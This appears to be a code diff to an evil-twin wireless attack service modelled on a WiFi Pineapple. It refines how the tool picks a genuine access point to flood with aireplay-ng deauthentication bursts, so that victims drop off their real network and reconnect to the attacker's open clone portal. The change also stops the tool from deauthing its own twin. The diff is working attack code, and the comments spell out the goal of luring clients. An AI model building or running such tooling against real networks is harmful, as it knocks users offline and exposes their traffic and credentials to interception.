@@ -1509,23 +1509,14 @@ class PineAPService:
         # Resolve the deauth target BEFORE reconfiguring — switching the AP to
         # "open" wipes the cloned evil_wpa_target metadata, so we'd otherwise
         # lose the BSSID/channel we need to deauth.
+        # NOTE: do NOT derive the deauth target from a picked handshake — a
+        # handshake captured by our own twin records the TWIN's BSSID as the
+        # AP MAC (a locally-administered bssid_for_ssid address), so deauthing
+        # it would knock clients off our own portal. The genuine upstream AP's
+        # BSSID only comes from Recon (or a clone whose source_bssid is real).
         d_bssid = d_channel = d_src = None
         if deauth:
-            # A picked handshake already pins the real AP — use its BSSID
-            # (and channel, falling back to the configured one) as the deauth
-            # target. Otherwise fall back to Recon / cloned-target lookup.
-            if handshake_id:
-                try:
-                    from app.services.handshakes import get_service as get_hs
-                    hb, hc = get_hs().get_capture_target(handshake_id)
-                except Exception:
-                    hb = hc = None
-                if hb:
-                    with self._lock:
-                        d_channel = hc or int(self._state.get("channel") or 6)
-                    d_bssid, d_src = self._fmt_mac(hb), "chosen handshake"
-            if not d_bssid:
-                d_bssid, d_channel, d_src = self._resolve_deauth_target(target_ssid)
+            d_bssid, d_channel, d_src = self._resolve_deauth_target(target_ssid)
         with self._lock:
             running = self._state.get("running")
 
@@ -1664,25 +1655,47 @@ class PineAPService:
             return ":".join(h[i:i + 2] for i in range(0, 12, 2))
         return mac.strip().lower()
 
+    def _twin_bssid(self, ssid: str | None) -> str | None:
+        """Our own open twin's BSSID for ``ssid`` (the deterministic
+        bssid_for_ssid address hostapd beacons). Used to make sure we never
+        deauth ourselves."""
+        try:
+            from app.tools import hostapd as hostapd_tool
+            with self._lock:
+                salt = (self._state or {}).get("bssid_salt")
+                s = ssid or (self._state or {}).get("primary_ssid") or "pineap"
+            return self._fmt_mac(hostapd_tool.bssid_for_ssid(s, salt))
+        except Exception:
+            return None
+
     def _resolve_deauth_target(self, ssid: str | None
                                ) -> tuple[str | None, int | None, str]:
-        """Find a (bssid, channel) to deauth for the direct path. Tries
-        Recon-by-SSID first, then falls back to a cloned Evil WPA target
-        (whose source BSSID/channel are stored in state) if it matches the
-        SSID or no Recon hit was found. Returns ``(bssid, channel, src)``."""
+        """Find a (bssid, channel) to deauth for the direct path: the
+        GENUINE upstream AP, so its clients drop and re-associate to our
+        open clone. Tries Recon-by-SSID first, then a cloned Evil WPA target
+        (whose source_bssid is the real AP). Refuses any candidate equal to
+        our own twin's BSSID — that would knock clients off our portal.
+        Returns ``(bssid, channel, src)``."""
+        twin = (self._twin_bssid(ssid) or "").lower()
+
+        def _ok(b: str | None) -> bool:
+            return bool(b) and self._fmt_mac(b) != twin
+
         ap = self._find_recon_ap(ssid)
-        if ap:
-            return ap["bssid"], int(ap["channel"]), "recon"
+        if ap and _ok(ap.get("bssid")):
+            return self._fmt_mac(ap["bssid"]), int(ap["channel"]), "recon"
         with self._lock:
             tgt = (self._state or {}).get("evil_wpa_target") or {}
             cur_ssid = (self._state or {}).get("primary_ssid")
         b = tgt.get("source_bssid")
         ch = tgt.get("source_channel")
-        # Use the cloned target if it matches the requested SSID (or the
-        # current primary, which the open twin clones), and has a channel.
-        if b and ch and (not ssid or tgt.get("source_essid") == ssid
-                         or cur_ssid == tgt.get("source_essid")):
-            return b, int(ch), "cloned target"
+        if b and ch and _ok(b) and (not ssid or tgt.get("source_essid") == ssid
+                                    or cur_ssid == tgt.get("source_essid")):
+            return self._fmt_mac(b), int(ch), "cloned target"
+        # If the only thing we could find IS our own twin BSSID, say so
+        # explicitly — that's the "handshake captured by the twin" case.
+        if (ap and not _ok(ap.get("bssid"))) or (b and not _ok(b)):
+            return None, None, "self"
         return None, None, "none"
 
     def _start_direct_deauth(self, ssid: str | None, *,
@@ -1698,6 +1711,12 @@ class PineAPService:
         if not (bssid and channel):
             bssid, channel, src = self._resolve_deauth_target(ssid)
         if not bssid or not channel:
+            if src == "self":
+                return ["deauth skipped: the only target found is our own "
+                        "twin's BSSID (the picked handshake was captured by "
+                        "the twin, not the real router). Run a Recon scan "
+                        "that sees the genuine AP so we can deauth it without "
+                        "knocking clients off our own open portal."]
             return [f"deauth requested but no target AP found for {ssid!r} — "
                     "skipping deauth. Run a Recon scan that sees this SSID, "
                     "or clone the target on the Evil WPA tab first."]
@@ -1756,19 +1775,20 @@ class PineAPService:
         # Brief settle so the radio is on-channel before the first burst.
         self._direct_deauth_stop.wait(2.0)
         while not self._direct_deauth_stop.is_set():
-            fired = False
+            attempted = False
             if not stub_mode():
                 try:
-                    ok, _ = aireplay.send_deauth(iface, bssid,
-                                                 client_mac=None, count=8)
-                    fired = bool(ok)
+                    aireplay.send_deauth(iface, bssid, client_mac=None, count=8)
+                    attempted = True
                 except Exception:
                     log.exception("pineap: direct deauth burst failed")
             else:
-                fired = True  # stub: count so the UI shows activity
-            if fired:
-                # In-memory bump so the EAPOL Sniffer section reflects it on
-                # its next poll (no disk write per burst).
+                attempted = True  # stub: count so the UI shows activity
+            if attempted:
+                # Count every burst we fired (aireplay's exit code is noisy on
+                # some drivers, so we count attempts — they're confirmed in the
+                # journal as 'exec: aireplay-ng --deauth …'). In-memory bump so
+                # the UI reflects it on the next poll (no disk write per burst).
                 with self._lock:
                     if self._state is not None:
                         self._state["direct_deauth_bursts"] = \
